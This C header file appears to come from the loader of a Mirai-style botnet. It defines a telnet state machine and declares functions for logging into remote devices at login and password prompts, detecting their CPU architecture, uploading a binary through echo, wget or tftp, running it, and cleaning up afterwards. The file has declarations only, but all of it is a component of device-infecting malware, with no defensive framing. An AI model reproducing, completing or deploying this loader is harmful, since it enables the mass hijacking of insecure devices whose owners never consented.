#ifndef _LOADER_CONNECTION_H
#define _LOADER_CONNECTION_H

/* ============================================================================
 * CONNECTION MODULE - Telnet State Machine
 * ============================================================================
 * 18 States: Closed -> Connecting -> IAC -> Login -> Upload -> Run -> Cleanup
 * Handles: Authentication, architecture detection, binary transfer
 * Timeout protection with last_recv tracking
 * ============================================================================ */

#include "includes.h"
#include "telnet_info.h"
#include "server.h"

/* Connection states */
#define TELNET_CLOSED 0
#define TELNET_CONNECTING 1
#define TELNET_READ_IACS 2
#define TELNET_USER_PROMPT 3
#define TELNET_PASS_PROMPT 4
#define TELNET_WAITPASS_PROMPT 5
#define TELNET_CHECK_LOGIN 6
#define TELNET_VERIFY_LOGIN 7
#define TELNET_READ_WRITEABLE 8
#define TELNET_COPY_ECHO 9
#define TELNET_DETECT_ARCH 10
#define TELNET_ARM_SUBTYPE 11
#define TELNET_UPLOAD_METHODS 12
#define TELNET_UPLOAD_ECHO 13
#define TELNET_UPLOAD_WGET 14
#define TELNET_UPLOAD_TFTP 15
#define TELNET_RUN_BINARY 16
#define TELNET_CLEANUP 17

struct connection {
    struct server *srv;
    int id;
    int fd;
    uint8_t state;
    struct telnet_info *info;
    time_t last_recv;
    time_t connect_time;
    char *output_buffer;
    int output_buffer_len;
    char *binary;
    int binary_len;
    char *arch;
};

struct connection *connection_open(struct server *, int, struct telnet_info *);
void connection_close(struct connection *);
void connection_handler(struct connection *);
void connection_consume_iacs(struct connection *);
void connection_consume_login_prompt(struct connection *);
void connection_consume_password_prompt(struct connection *);
void connection_consume_prompt(struct connection *);
void connection_verify_login(struct connection *);
void connection_detect_arch(struct connection *);
void connection_upload_echo(struct connection *);
void connection_upload_wget(struct connection *);
void connection_upload_tftp(struct connection *);
void connection_run_binary(struct connection *);

#endif
